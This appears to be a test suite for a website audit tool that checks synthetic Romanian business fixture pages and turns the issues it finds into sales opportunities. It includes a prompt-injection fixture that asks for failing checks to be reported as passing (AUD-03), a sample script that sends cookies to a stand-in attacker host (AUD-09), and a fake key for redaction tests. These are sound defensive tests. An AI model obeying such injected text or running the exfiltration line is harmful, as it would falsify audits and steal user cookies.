// Milestone 04 §2.3 — static website audit and the opportunities derived from it. Pure functions over the fictitious fixture
// sites in v2/fixtures/sales/sites (.test hosts, synthetic data). No network, no model.
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { auditHtml, opportunitiesFromAudit, AUDIT_CHECKS, AUDIT_VERSION, CHECK_SERVICE_TAGS } from "../server/sales/audit.mjs";

const here = path.dirname(fileURLToPath(import.meta.url));
const SITES = path.resolve(here, "..", "fixtures", "sales", "sites");
const IDS = AUDIT_CHECKS.map((c) => c.id);

/** Reads a fixture the way the fixture adapter serves it (scheme from `fixture:scheme`, https by default). */
function loadFixture(host) {
  const html = fs.readFileSync(path.join(SITES, `${host}.html`), "utf8");
  const scheme = /<meta\s+name=["']fixture:scheme["']\s+content=["'](https?)["']/i.exec(html)?.[1] || "https";
  return { html, url: `${scheme}://${host}/` };
}
const auditFixture = (host, orgName, extra = {}) => auditHtml({ ...loadFixture(host), orgName, fetchedAt: "2026-10-01T10:00:00.000Z", ...extra });
const statusesOf = (audit) => Object.fromEntries(audit.checks.map((c) => [c.id, c.status]));
const all = (status, overrides = {}) => ({ ...Object.fromEntries(IDS.map((id) => [id, status])), ...overrides });
const byId = (audit, id) => audit.checks.find((c) => c.id === id);

const FIXTURES = {
  "atelierul-verde.test": { org: "Atelierul Verde SRL", expected: all("PASS") },
  "spicul-auriu.test": { org: "Brutăria Spicul Auriu", expected: all("PASS", { mobile_viewport: "ISSUE", https: "ISSUE" }) },
  "lumen-foto.test": { org: "Studio Lumen", expected: all("PASS", { contact_phone: "ISSUE", contact_email: "ISSUE", contact_address: "ISSUE", contact_form: "ISSUE", form_labels: "NOT_APPLICABLE", lang_attr: "ISSUE", images_alt: "ISSUE", internal_anchors: "ISSUE" }) },
  "delta-termo.test": { org: "Instalații Delta Termo", expected: all("PASS", { form_labels: "ISSUE", images_alt: "NOT_APPLICABLE" }) },
  "jurnalul-orasului.test": { org: "Cofetăria Dulce Colț", expected: all("NOT_APPLICABLE", { identity_name: "ISSUE" }) },
  "targul-online.test": { org: "Pensula Rapidă", expected: all("NOT_APPLICABLE", { identity_name: "ISSUE" }) },
  "aurora-panificatie.test": { org: "Brutăria Aurora", expected: all("PASS", { identity_name: "ISSUE", images_alt: "NOT_APPLICABLE" }) },
  "service-auto-boltul.test": { org: "Service Auto Boltul", expected: all("PASS", { services_described: "ISSUE", mobile_viewport: "ISSUE", images_alt: "ISSUE" }) },
  "croitoria-stefanescu.test": { org: "Croitoria Ștefănescu S.R.L.", expected: all("PASS", { internal_anchors: "NOT_APPLICABLE" }) },
  "ritm-fitness.test": { org: "Sala Fitness Ritm", expected: all("UNKNOWN", { identity_name: "PASS", title_present: "PASS", mobile_viewport: "PASS", https: "PASS", lang_attr: "PASS" }) },
};

const CATALOG = [
  { id: "svc-responsive", name: "Site adaptat pentru mobil", tags: ["responsive", "website"], active: true },
  { id: "svc-contact", name: "Pagină de contact", tags: ["contact"], active: true },
  { id: "svc-a11y", name: "Accesibilitate de bază", tags: ["accessibility"], active: true },
  { id: "svc-seo", name: "SEO de bază", tags: ["seo-basic"], active: true },
];

test("M04-AUD-01 every fixture site gets exactly the expected status for each of the 14 checks", () => {
  assert.equal(fs.readdirSync(SITES).filter((f) => f.endsWith(".test.html")).length, Object.keys(FIXTURES).length);
  for (const [host, { org, expected }] of Object.entries(FIXTURES)) {
    const audit = auditFixture(host, org);
    assert.equal(audit.version, AUDIT_VERSION, host);
    assert.deepEqual(audit.checks.map((c) => c.id), IDS, `${host}: checks in contract order`);
    assert.deepEqual(statusesOf(audit), expected, host);
    assert.equal(audit.sourceKind, "fixture");
    assert.equal(audit.fetchedAt, "2026-10-01T10:00:00.000Z");
    assert.ok(audit.limits.some((l) => l.includes("fixture")), `${host}: fixture source is stated in limits`);
  }
});

test("M04-AUD-02 every check carries evidence; PASS and ISSUE are backed by a selector, PASS by an excerpt; excerpts ≤ 200 chars", () => {
  for (const [host, { org }] of Object.entries(FIXTURES)) {
    for (const check of auditFixture(host, org).checks) {
      const where = `${host}/${check.id}`;
      assert.ok(["PASS", "ISSUE", "UNKNOWN", "NOT_APPLICABLE"].includes(check.status), where);
      assert.ok(["OBSERVED", "INFERRED"].includes(check.label), where);
      assert.ok(typeof check.observation === "string" && check.observation.length > 5, where);
      assert.equal(check.evidence.method, "static-html", where);
      assert.equal(typeof check.evidence.excerpt, "string", where);
      assert.ok(check.evidence.excerpt.length <= 200, where);
      if (check.status === "PASS" || check.status === "ISSUE") assert.ok(check.evidence.selector.length > 0, where);
      if (check.status === "PASS") assert.ok(check.evidence.excerpt.length > 0, `${where}: PASS without excerpt`);
    }
  }
  // Spot checks: the evidence points to the element that was seen.
  const good = auditFixture("atelierul-verde.test", "Atelierul Verde SRL");
  assert.match(byId(good, "contact_phone").evidence.excerpt, /tel:\+40721000101/);
  assert.match(byId(good, "mobile_viewport").evidence.excerpt, /width=device-width/);
  assert.equal(byId(good, "identity_name").evidence.selector, "head > title");
  const lumen = auditFixture("lumen-foto.test", "Studio Lumen");
  assert.match(byId(lumen, "internal_anchors").observation, /#portofoliu/);
  assert.match(byId(lumen, "images_alt").evidence.excerpt, /produs-2\.jpg/);
  const delta = auditFixture("delta-termo.test", "Instalații Delta Termo");
  assert.match(byId(delta, "form_labels").observation, /^3 din 4 câmpuri/); // the labelled search field counts as labelled
  assert.equal(byId(delta, "contact_address").label, "INFERRED"); // found by a text pattern, not an <address> element
});

test("M04-AUD-03 prompt-injection text has no effect: same checks as the page without it, nothing of it in the results", () => {
  const { html, url } = loadFixture("service-auto-boltul.test");
  const stripped = html.replace(/<!-- inj:start -->[\s\S]*?<!-- inj:end -->/g, "");
  assert.notEqual(stripped, html);
  const withInjection = auditHtml({ html, url, orgName: "Service Auto Boltul" });
  const without = auditHtml({ html: stripped, url, orgName: "Service Auto Boltul" });
  assert.deepEqual(withInjection.checks, without.checks);
  assert.deepEqual(opportunitiesFromAudit(withInjection, CATALOG), opportunitiesFromAudit(without, CATALOG));
  // The page asked for viewport / alt / services to be reported as fine: they stay ISSUE.
  for (const id of ["mobile_viewport", "images_alt", "services_described"]) assert.equal(byId(withInjection, id).status, "ISSUE", id);
  const output = JSON.stringify({ checks: withInjection.checks, signals: withInjection.signals, opportunities: opportunitiesFromAudit(withInjection, CATALOG) });
  for (const needle of ["exemplu-atac", "WON", "799", "ignor", "SYSTEM PROMPT", "scope", "acces complet"]) assert.ok(!output.includes(needle), `leaked: ${needle}`);
  // The only difference: an owner-facing note that the page contains instruction-like text.
  assert.equal(withInjection.signals.injectionSuspected, true);
  assert.equal(without.signals.injectionSuspected, false);
  assert.ok(withInjection.limits.some((l) => /prompt injection/.test(l)));
  assert.ok(!without.limits.some((l) => /prompt injection/.test(l)));
});

test("M04-AUD-04 an article and a marketplace listing are flagged in the identity check; the site checks do not apply", () => {
  const article = auditFixture("jurnalul-orasului.test", "Cofetăria Dulce Colț");
  assert.equal(article.pageKind, "article");
  assert.equal(byId(article, "identity_name").label, "INFERRED");
  assert.match(byId(article, "identity_name").observation, /articol/);
  assert.match(byId(article, "identity_name").evidence.excerpt, /og:type|NewsArticle/);
  const listing = auditFixture("targul-online.test", "Pensula Rapidă");
  assert.equal(listing.pageKind, "marketplace_listing");
  assert.match(byId(listing, "identity_name").observation, /marketplace/);
  for (const audit of [article, listing]) {
    const opps = opportunitiesFromAudit(audit, [{ id: "svc-site", name: "Site de prezentare", tags: ["website"] }]);
    assert.deepEqual(opps.map((o) => [o.checkId, o.serviceId, o.tag]), [["identity_name", "svc-site", "website"]]);
    assert.match(opps[0].possibleEffect, /site propriu/);
    assert.ok(opps[0].conditionsToConfirm.some((q) => /site oficial/.test(q)));
  }
});

test("M04-AUD-05 contradictory data: two company names make identity an ISSUE; two phones are both reported", () => {
  const audit = auditFixture("aurora-panificatie.test", "Brutăria Aurora");
  const identity = byId(audit, "identity_name");
  assert.equal(identity.status, "ISSUE");
  assert.equal(identity.label, "INFERRED");
  assert.match(identity.observation, /Brutăria Aurora SRL/);
  assert.match(identity.observation, /Panificația Zorilor SRL/);
  assert.deepEqual(audit.signals.phones, ["+40721000201", "+40744000202"]);
  assert.match(byId(audit, "contact_phone").observation, /2 numere de telefon diferite.*\+40721000201.*\+40744000202/);
  const opp = opportunitiesFromAudit(audit, CATALOG).find((o) => o.checkId === "identity_name");
  assert.match(opp.possibleEffect, /Denumiri diferite/);
});

test("M04-AUD-06 Romanian diacritics: cedilla and comma-below spellings, HTML entities and legal forms compare equal", () => {
  const variants = ["Croitoria Ștefănescu S.R.L.", "Croitoria Ştefănescu", "CROITORIA STEFANESCU SRL", "croitoria stefanescu"];
  for (const org of variants) {
    const identity = byId(auditFixture("croitoria-stefanescu.test", org), "identity_name");
    assert.equal(identity.status, "PASS", org);
  }
  const audit = auditFixture("croitoria-stefanescu.test", "Croitoria Ștefănescu S.R.L.");
  assert.match(byId(audit, "title_present").evidence.excerpt, /Croitoria Ştefănescu – Croitorie la comandă şi retuşuri/); // entities decoded
  assert.match(byId(audit, "contact_address").observation, /Strada Mărţişorului nr\. 7/);
  assert.equal(byId(audit, "identity_name").observation.includes("„Croitoria Ștefănescu S.R.L.”"), true);
  assert.equal(byId(auditFixture("croitoria-stefanescu.test", "Croitoria Popescu"), "identity_name").status, "ISSUE");
});

test("M04-AUD-07 script-only pages, empty pages, unknown URLs and bad input", () => {
  const shell = auditFixture("ritm-fitness.test", "Sala Fitness Ritm");
  assert.equal(shell.signals.scriptShell, true);
  assert.equal(shell.pageKind, "unknown");
  assert.ok(shell.limits.some((l) => /JavaScript/.test(l)));
  assert.equal(byId(shell, "contact_phone").label, "INFERRED");

  const empty = auditHtml({ html: "   ", url: "https://gol.test/" });
  assert.deepEqual(statusesOf(empty), all("UNKNOWN", { https: "PASS" }));

  const noUrl = auditHtml({ html: "<html lang=ro><title>Firma Test</title><body><h1>Firma Test</h1></body></html>", orgName: "" });
  assert.equal(byId(noUrl, "https").status, "UNKNOWN");
  assert.equal(byId(noUrl, "identity_name").status, "UNKNOWN"); // no organization name to match

  const creds = auditHtml({ html: "<title>x</title>", url: "https://user:parola@firma.test/pagina" });
  assert.equal(creds.url, "https://firma.test/pagina");
  assert.ok(!JSON.stringify(creds).includes("parola"));

  assert.throws(() => auditHtml({ html: null }), (e) => e.category === "validation");
  assert.throws(() => auditHtml({ html: { toString: () => "<p>x</p>" } }), (e) => e.category === "validation");
  assert.equal(auditHtml({ html: Buffer.from("<title>Din buffer</title>", "utf8") }).checks[1].status, "PASS");
});

test("M04-AUD-08 excerpts are clipped to 200 characters and redacted", () => {
  const token = `sk-${"ant"}-${"q".repeat(28)}`;
  const longTitle = `Firma Lungă ${token} ${"cuvânt ".repeat(120)}`;
  const audit = auditHtml({ html: `<html lang="ro"><head><title>${longTitle}</title></head><body><h1>Firma Lungă</h1></body></html>`, url: "https://lunga.test/", orgName: "Firma Lungă" });
  for (const check of audit.checks) {
    assert.ok(check.evidence.excerpt.length <= 200, check.id);
    assert.ok(!check.evidence.excerpt.includes(token) && !check.observation.includes(token), check.id);
  }
  const title = byId(audit, "title_present");
  assert.equal(title.evidence.excerpt.length, 200);
  assert.ok(title.evidence.excerpt.endsWith("…"));
  assert.match(title.evidence.excerpt, /\[redacted/);
  // Bidi overrides / zero-width characters cannot reorder or hide excerpt text.
  const bidi = auditHtml({ html: `<title>Firma${String.fromCharCode(0x202e)} abc${String.fromCharCode(0x200b)} def</title>`, url: "https://bidi.test/" });
  assert.equal(byId(bidi, "title_present").evidence.excerpt, "Firma abc def");
});

test("M04-AUD-09 the parser reads, never executes: hidden text, comments and scripts are not page content; malformed HTML is tolerated", () => {
  const html = [
    "<!doctype html><html lang='ro'><head><title>Pagină de test</title>",
    "<script>document.title = 'Firma Ascunsă'; fetch('https://atac.test/?x=' + document.cookie)</script></head><body>",
    "<h1 style='display:none'>Firma Ascunsă</h1><div hidden><a href='tel:0731000999'>0731 000 999</a></div>",
    "<!-- <footer>Firma Ascunsă SRL</footer> -->",
    "<p class='hidden'>contact@ascuns.test</p>",
    "<div/><p>text <b>neînchis <a =x href='#lipsa'>legătură</a>",
    "<span __proto__='x' constructor='y'>atribute ciudate</span>",
    "<img src=/a.png alt>",
  ].join("");
  const audit = auditHtml({ html, url: "https://parser.test/", orgName: "Firma Ascunsă" });
  assert.equal(byId(audit, "identity_name").status, "ISSUE");
  assert.equal(byId(audit, "contact_phone").status, "ISSUE");
  assert.equal(byId(audit, "contact_email").status, "ISSUE");
  assert.equal(byId(audit, "internal_anchors").status, "ISSUE");
  assert.equal(byId(audit, "images_alt").status, "PASS"); // an empty alt marks a decorative image
  assert.equal(Object.getPrototypeOf({}).x, undefined); // the "__proto__" attribute polluted nothing

  const deep = `<html><body>${"<div>".repeat(5000)}<h2>Servicii</h2>${"</div>".repeat(5000)}</body></html>`;
  assert.equal(byId(auditHtml({ html: deep, url: "https://adanc.test/" }), "services_described").status, "PASS");
  const unclosed = auditHtml({ html: "<html><head><title>Fără sfârșit</title><script>while(true){}", url: "https://neinchis.test/" });
  assert.equal(byId(unclosed, "title_present").status, "PASS");
});

test("M04-OPP-01 ISSUE checks map to the first active catalog service with the check's tag", () => {
  const audit = auditFixture("lumen-foto.test", "Studio Lumen");
  const opps = opportunitiesFromAudit(audit, CATALOG);
  assert.deepEqual(opps.map((o) => [o.checkId, o.tag, o.serviceId]), [
    ["contact_phone", "contact", "svc-contact"],
    ["contact_email", "contact", "svc-contact"],
    ["contact_address", "contact", "svc-contact"],
    ["contact_form", "contact", "svc-contact"],
    ["lang_attr", "accessibility", "svc-a11y"],
    ["images_alt", "accessibility", "svc-a11y"],
    ["internal_anchors", "website", "svc-responsive"],
  ]);
  for (const o of opps) {
    assert.deepEqual(Object.keys(o).slice(0, 5), ["checkId", "observation", "possibleEffect", "serviceId", "conditionsToConfirm"]);
    assert.equal(o.observation, byId(audit, o.checkId).observation);
    assert.ok(o.possibleEffect.length > 10);
    assert.ok(Array.isArray(o.conditionsToConfirm));
    assert.ok(!o.notes.some((n) => /niciun serviciu configurat/.test(n)));
  }
  const spicul = opportunitiesFromAudit(auditFixture("spicul-auriu.test", "Brutăria Spicul Auriu"), CATALOG);
  assert.deepEqual(spicul.map((o) => [o.checkId, o.serviceId]), [["mobile_viewport", "svc-responsive"], ["https", "svc-responsive"]]);
  // Every check id has a tag from the contract's tag set.
  assert.deepEqual([...new Set(Object.values(CHECK_SERVICE_TAGS))].sort(), ["accessibility", "contact", "responsive", "seo-basic", "website"]);
  assert.deepEqual(Object.keys(CHECK_SERVICE_TAGS).sort(), [...IDS].sort());
});

test("M04-OPP-02 without a configured service: serviceId null and the note „niciun serviciu configurat”", () => {
  const audit = auditFixture("spicul-auriu.test", "Brutăria Spicul Auriu");
  for (const catalog of [[], undefined, null, { services: [] }]) {
    const opps = opportunitiesFromAudit(audit, catalog);
    assert.equal(opps.length, 2);
    for (const o of opps) {
      assert.equal(o.serviceId, null);
      assert.ok(o.notes.some((n) => n.includes("niciun serviciu configurat")), JSON.stringify(o.notes));
    }
  }
  // Inactive services are ignored; tags may come as stored JSON text; catalog order decides between two matches.
  const catalog = [
    { id: "svc-old", tags: ["responsive"], active: false },
    { id: "svc-archived", tags: ["responsive"], status: "ARCHIVED" },
    { id: "svc-first", tags: '["Responsive"]' },
    { id: "svc-second", tags: ["responsive"] },
  ];
  assert.equal(opportunitiesFromAudit(audit, catalog).find((o) => o.checkId === "mobile_viewport").serviceId, "svc-first");
  assert.equal(opportunitiesFromAudit(audit, catalog).find((o) => o.checkId === "https").serviceId, null);
});

test("M04-OPP-03 only ISSUE checks become opportunities; INFERRED ones say so; invalid audits are refused", () => {
  assert.deepEqual(opportunitiesFromAudit(auditFixture("atelierul-verde.test", "Atelierul Verde SRL"), CATALOG), []);
  assert.deepEqual(opportunitiesFromAudit(auditFixture("ritm-fitness.test", "Sala Fitness Ritm"), CATALOG), []);
  const boltul = opportunitiesFromAudit(auditFixture("service-auto-boltul.test", "Service Auto Boltul"), CATALOG);
  const services = boltul.find((o) => o.checkId === "services_described");
  assert.equal(services.label, "INFERRED");
  assert.ok(services.notes.some((n) => /INFERRED/.test(n)));
  assert.equal(boltul.find((o) => o.checkId === "mobile_viewport").label, "OBSERVED");
  assert.throws(() => opportunitiesFromAudit(null, CATALOG), (e) => e.category === "validation");
  assert.throws(() => opportunitiesFromAudit({ checks: "x" }, CATALOG), (e) => e.category === "validation");
  assert.throws(() => opportunitiesFromAudit({ version: "audit-v0", checks: [] }, CATALOG), (e) => e.category === "validation");
  // Unknown check ids or duplicates in a stored audit are ignored, not mapped twice.
  const odd = { version: AUDIT_VERSION, checks: [{ id: "https", status: "ISSUE", observation: "a", label: "OBSERVED" }, { id: "https", status: "ISSUE", observation: "b" }, { id: "altceva", status: "ISSUE" }] };
  assert.deepEqual(opportunitiesFromAudit(odd, CATALOG).map((o) => o.checkId), ["https"]);
});
